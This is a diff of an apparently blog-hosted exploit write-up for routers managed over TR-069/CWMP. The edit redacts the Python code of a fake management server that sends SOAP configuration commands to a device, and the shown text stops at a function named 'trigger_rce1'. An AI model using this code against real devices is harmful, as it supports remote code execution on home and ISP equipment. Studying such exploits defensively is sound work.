@@ -53,7 +53,7 @@
         </div>
         <div>
           <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
-          5 min read
+          4 min read
         </div>
       </div>
     </header>
@@ -110,129 +110,28 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transform_header</span>(header: dict) <span style="color:#f92672">-&gt;</span> str:
-</span></span><span style="display:flex;"><span>    header_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key, values <span style="color:#f92672">in</span> header<span style="color:#f92672">.</span>items():
-</span></span><span style="display:flex;"><span>        header_str <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>values<span style="color:#e6db74">}</span><span style="color:#ae81ff">\x0d\x0a</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> header_str
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_body</span>(data: bytes):
-</span></span><span style="display:flex;"><span>    placeholder <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;soap-env:Envelope xmlns:soap-enc=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34; xmlns:soap-env=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:cwmp=&#34;urn:dslforum-org:cwmp-1-0&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;soap-env:Header&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;cwmp:ID soap-env:mustUnderstand=&#34;1&#34;&gt;a&lt;/cwmp:ID&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/soap-env:Header&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;soap-env:Body&gt;%b
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/soap-env:Body&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/soap-env:Envelope&gt;&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> (
-</span></span><span style="display:flex;"><span>        data
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> placeholder
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_http_response</span>(code: int, header: dict, body: bytes, p):
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> transform_header(header)
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;HTTP/1.1 </span><span style="color:#e6db74">{</span>code<span style="color:#e6db74">}</span><span style="color:#e6db74"> OK&#34;</span><span style="color:#f92672">.</span>encode()
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d\x0a</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> headers<span style="color:#f92672">.</span>encode()
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0d\x0a</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> body
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_header</span>(data):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Length&#34;</span>: len(data),
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Server&#34;</span>: <span style="color:#e6db74">&#34;YouAlreadyKnowWhoItIs&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;SOAPServer&#34;</span>: <span style="color:#e6db74">&#34;YouAlreadyKnowWhoItIs&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#39;text/xml; charset=&#34;utf-8&#34;&#39;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Set-Cookie&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;session=secret</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">cookie&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Date&#34;</span>: <span style="color:#e6db74">&#34;Mon, 13 Mar 2007 13:33:37 GMT&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;keep-alive&#34;</span>,
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">informresponse</span>(p):
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    informResponse <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;soap-env:Envelope xmlns:soap-enc=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34; xmlns:soap-env=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:cwmp=&#34;urn:dslforum-org:cwmp-1-0&#34;&gt;&lt;soap-env:Header&gt;&lt;cwmp:ID soap-env:mustUnderstand=&#34;1&#34;&gt;1003&lt;/cwmp:ID&gt;&lt;/soap-env:Header&gt;&lt;soap-env:Body&gt;&lt;cwmp:InformResponse&gt;&lt;MaxEnvelopes&gt;1&lt;/MaxEnvelopes&gt;&lt;/cwmp:InformResponse&gt;&lt;/soap-env:Body&gt;&lt;/soap-env:Envelope&gt;&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> generate_header(informResponse)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(send_http_response(<span style="color:#ae81ff">200</span>, headers, informResponse, p))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_config_value</span>(name: str, data_type: str, value: bytes, p):
-</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;cwmp:SetParameterValues&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;ParameterList soap-enc:arrayType=&#34;cwmp:ParameterValueStruct[1]&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;ParameterValueStruct&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;Name&gt;%b&lt;/Name&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;Value xsi:type=&#34;xsd:%b&#34;&gt;%b&lt;/Value&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/ParameterValueStruct&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/ParameterList&gt;&lt;ParameterKey&gt;&lt;/ParameterKey&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/cwmp:SetParameterValues&gt;&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> (
-</span></span><span style="display:flex;"><span>        name<span style="color:#f92672">.</span>encode(),
-</span></span><span style="display:flex;"><span>        data_type<span style="color:#f92672">.</span>encode(),
-</span></span><span style="display:flex;"><span>        value,
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Sent data: &#34;</span> <span style="color:#f92672">+</span> data<span style="color:#f92672">.</span>decode())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> generate_body(data)
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> generate_header(body)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(send_http_response(<span style="color:#ae81ff">200</span>, headers, body, p))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_parameter_name</span>(name, p):
-</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;cwmp:GetParameterNames&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;ParameterPath&gt;%b&lt;/ParameterPath&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;NextLevel&gt;0&lt;/NextLevel&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/cwmp:GetParameterNames&gt;&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> (
-</span></span><span style="display:flex;"><span>        name
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> generate_body(data)
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> generate_header(body)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(send_http_response(<span style="color:#ae81ff">200</span>, headers, body, p))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_configvalue</span>(name, p):
-</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;cwmp:GetParameterValues&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;ParameterNames SOAP-ENC:arrayType=&#34;xsd:string[1]&#34; xmlns:SOAP-ENC=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;string&gt;%b&lt;/string&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/ParameterNames&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/cwmp:GetParameterValues&gt;&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> (
-</span></span><span style="display:flex;"><span>        name
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> generate_body(data)
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> generate_header(body)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(send_http_response(<span style="color:#ae81ff">200</span>, headers, body, p))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_object</span>(object_name, paramKey, p):
-</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;cwmp:AddObject&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;ObjectName&gt;InternetGatewayDevice.%b&lt;/ObjectName&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;ParameterKey&gt;%b&lt;/ParameterKey&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/cwmp:AddObject&gt;&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> (
-</span></span><span style="display:flex;"><span>        object_name,
-</span></span><span style="display:flex;"><span>        paramKey,
-</span></span><span style="display:flex;"><span>    )
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> generate_body(data)
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> generate_header(body)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(send_http_response(<span style="color:#ae81ff">200</span>, headers, body, p))
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">close_conn</span>(p):
-</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> generate_header()
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    headers<span style="color:#f92672">.</span>update({<span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>})
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(send_http_response(<span style="color:#ae81ff">200</span>, headers, <span style="color:#e6db74">&#34;&#34;</span>, p))
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_config_value</span>(name: str, data_type: str, value: bytes, p):
+</span></span><span style="display:flex;"><span>    [<span style="color:#f92672">...</span>]
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trigger_rce1</span>(ip: str, port: int, p):
 </span></span><span style="display:flex;"><span>    set_config_value(
